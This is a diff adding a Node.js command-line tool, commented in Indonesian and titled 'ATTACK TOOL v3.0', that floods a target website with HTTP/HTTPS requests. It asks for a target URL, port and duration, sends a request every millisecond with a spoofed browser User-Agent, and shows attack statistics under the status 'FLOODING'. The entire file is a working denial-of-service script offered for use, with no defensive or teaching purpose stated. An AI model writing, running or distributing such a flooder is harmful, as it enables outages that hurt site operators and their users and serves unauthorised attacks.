@@ -1,0 +1,194 @@
+#!/usr/bin/env node
+
+const http = require('http');
+const https = require('https');
+const url = require('url');
+
+// Warna buat tampilan
+const colors = {
+    red: '\x1b[31m',
+    green: '\x1b[32m',
+    yellow: '\x1b[33m',
+    blue: '\x1b[34m',
+    magenta: '\x1b[35m',
+    cyan: '\x1b[36m',
+    white: '\x1b[37m',
+    reset: '\x1b[0m',
+    bold: '\x1b[1m'
+};
+
+// Banner
+console.clear();
+console.log(`${colors.red}${colors.bold}`);
+console.log('╔════════════════════════════════════════════════════════════╗');
+console.log('║                    🌪️  ATTACK TOOL v3.0  🌪️                 ║');
+console.log('║                   HTTP/HTTPS Flood Attack                  ║');
+console.log('╚════════════════════════════════════════════════════════════╝');
+console.log(`${colors.reset}`);
+
+// Input dari user
+const readline = require('readline').createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+readline.question(`${colors.cyan}🌐 Target URL (https://example.com): ${colors.reset}`, (target) => {
+    readline.question(`${colors.cyan}🔌 Port (kosongkan jika default): ${colors.reset}`, (port) => {
+        readline.question(`${colors.cyan}⏱️  Durasi (detik, 0 = unlimited): ${colors.reset}`, (duration) => {
+            readline.close();
+            
+            const parsed = url.parse(target);
+            const targetPort = port ? parseInt(port) : (parsed.port || (parsed.protocol === 'https:' ? 443 : 80));
+            const attackDuration = parseInt(duration) || 0;
+            
+            startAttack(target, targetPort, attackDuration, parsed);
+        });
+    });
+});
+
+function startAttack(target, targetPort, attackDuration, parsed) {
+    console.clear();
+    console.log(`${colors.green}${colors.bold}`);
+    console.log('╔════════════════════════════════════════════════════════════╗');
+    console.log('║                    🔥 ATTACK ACTIVE 🔥                     ║');
+    console.log('╚════════════════════════════════════════════════════════════╝');
+    console.log(`${colors.reset}`);
+    
+    console.log(`${colors.yellow}📊 Target Info:${colors.reset}`);
+    console.log(`   ├─ URL: ${colors.cyan}${target}${colors.reset}`);
+    console.log(`   ├─ Host: ${colors.green}${parsed.hostname}${colors.reset}`);
+    console.log(`   ├─ Port: ${colors.red}${targetPort}${colors.reset}`);
+    console.log(`   └─ Protocol: ${colors.magenta}${parsed.protocol}${colors.reset}`);
+    console.log('');
+    
+    const protocol = parsed.protocol === 'https:' ? https : http;
+    let packetCount = 0;
+    let successCount = 0;
+    let errorCount = 0;
+    let startTime = Date.now();
+    
+    const options = {
+        hostname: parsed.hostname,
+        port: targetPort,
+        path: parsed.path || '/',
+        method: 'GET',
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache'
+        }
+    };
+    
+    // Animasi spinner
+    const spinner = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'];
+    let spinIndex = 0;
+    
+    // Update stats setiap detik
+    const statsInterval = setInterval(() => {
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const pps = Math.floor(packetCount / (elapsed || 1));
+        const successRate = packetCount > 0 ? ((successCount / packetCount) * 100).toFixed(1) : 0;
+        
+        console.clear();
+        console.log(`${colors.green}${colors.bold}`);
+        console.log('╔════════════════════════════════════════════════════════════╗');
+        console.log('║                    🔥 ATTACK ACTIVE 🔥                     ║');
+        console.log('╚════════════════════════════════════════════════════════════╝');
+        console.log(`${colors.reset}`);
+        
+        console.log(`${colors.yellow}📊 Target Info:${colors.reset}`);
+        console.log(`   ├─ URL: ${colors.cyan}${target}${colors.reset}`);
+        console.log(`   ├─ Port: ${colors.red}${targetPort}${colors.reset}`);
+        console.log(`   └─ Status: ${colors.green}● FLOODING${colors.reset}`);
+        console.log('');
+        
+        console.log(`${colors.yellow}📈 Statistics:${colors.reset}`);
+        console.log(`   ├─ ${colors.cyan}Spinner:${colors.reset} ${spinner[spinIndex % spinner.length]} ${colors.white}Attack Running${colors.reset}`);
+        console.log(`   ├─ ${colors.green}Packets Sent:${colors.reset} ${packetCount.toLocaleString()}`);
+        console.log(`   ├─ ${colors.blue}Success:${colors.reset} ${successCount.toLocaleString()}`);
+        console.log(`   ├─ ${colors.red}Errors:${colors.reset} ${errorCount.toLocaleString()}`);
+        console.log(`   ├─ ${colors.yellow}Packets/sec:${colors.reset} ${pps.toLocaleString()}`);
+        console.log(`   ├─ ${colors.magenta}Success Rate:${colors.reset} ${successRate}%`);
+        console.log(`   └─ ${colors.white}Elapsed:${colors.reset} ${elapsed}s ${attackDuration > 0 ? `/ ${attackDuration}s` : '(unlimited)'}`);
+        console.log('');
+        
+        // Progress bar buat durasi (kalo ada)
+        if (attackDuration > 0) {
+            const percent = Math.min((elapsed / attackDuration) * 100, 100);
+            const barLen = 40;
+            const filled = Math.floor(barLen * percent / 100);
+            const empty = barLen - filled;
+            console.log(`${colors.yellow}⏱️  Progress:${colors.reset} [${colors.green}${'█'.repeat(filled)}${colors.reset}${'░'.repeat(empty)}] ${percent.toFixed(1)}%`);
+            console.log('');
+        }
+        
+        console.log(`${colors.cyan}💡 Press ${colors.bold}CTRL+C${colors.reset}${colors.cyan} to stop attack${colors.reset}`);
+        
+        spinIndex++;
+    }, 100);
+    
+    // Attack function
+    const intervalId = setInterval(() => {
+        const req = protocol.request(options, (res) => {
+            successCount++;
+            packetCount++;
+            res.resume(); // Consume response data
+        });
+        
+        req.on('error', (e) => {
+            errorCount++;
+            packetCount++;
+        });
+        
+        req.end();
+    }, 1); // High frequency
+    
+    // Handle duration limit
+    if (attackDuration > 0) {
+        setTimeout(() => {
+            clearInterval(intervalId);
+            clearInterval(statsInterval);
+            
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            console.clear();
+            console.log(`${colors.green}${colors.bold}`);
+            console.log('╔════════════════════════════════════════════════════════════╗');
+            console.log('║                    ✅ ATTACK FINISHED ✅                   ║');
+            console.log('╚════════════════════════════════════════════════════════════╝');
+            console.log(`${colors.reset}`);
+            console.log(`${colors.yellow}📊 Final Statistics:${colors.reset}`);
+            console.log(`   ├─ Total Packets: ${colors.green}${packetCount.toLocaleString()}${colors.reset}`);
+            console.log(`   ├─ Success: ${colors.blue}${successCount.toLocaleString()}${colors.reset}`);
+            console.log(`   ├─ Errors: ${colors.red}${errorCount.toLocaleString()}${colors.reset}`);
+            console.log(`   ├─ Avg PPS: ${colors.cyan}${Math.floor(packetCount / elapsed).toLocaleString()}${colors.reset}`);
+            console.log(`   └─ Duration: ${colors.white}${elapsed}s${colors.reset}`);
+            console.log('');
+            console.log(`${colors.green}✨ Attack completed successfully!${colors.reset}`);
+            process.exit(0);
+        }, attackDuration * 1000);
+    }
+    
+    // Handle manual stop
+    process.on('SIGINT', () => {
+        clearInterval(intervalId);
+        clearInterval(statsInterval);
+        
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        console.clear();
+        console.log(`${colors.yellow}${colors.bold}`);
+        console.log('╔════════════════════════════════════════════════════════════╗');
+        console.log('║                    ⏹️  ATTACK STOPPED ⏹️                    ║');
+        console.log('╚════════════════════════════════════════════════════════════╝');
+        console.log(`${colors.reset}`);
+        console.log(`${colors.yellow}📊 Final Statistics:${colors.reset}`);
+        console.log(`   ├─ Total Packets: ${colors.green}${packetCount.toLocaleString()}${colors.reset}`);
+        console.log(`   ├─ Success: ${colors.blue}${successCount.toLocaleString()}${colors.reset}`);
+        console.log(`   ├─ Errors: ${colors.red}${errorCount.toLocaleString()}${colors.reset}`);
+        console.log(`   ├─ Avg PPS: ${colors.cyan}${Math.floor(packetCount / elapsed).toLocaleString()}${colors.reset}`);
+        console.log(`   └─ Duration: ${colors.white}${elapsed}s${colors.reset}`);
+        console.log('');
+        console.log(`${colors.red}⚠️  Attack stopped by user${colors.reset}`);
+        process.exit(0);
+    });
+}
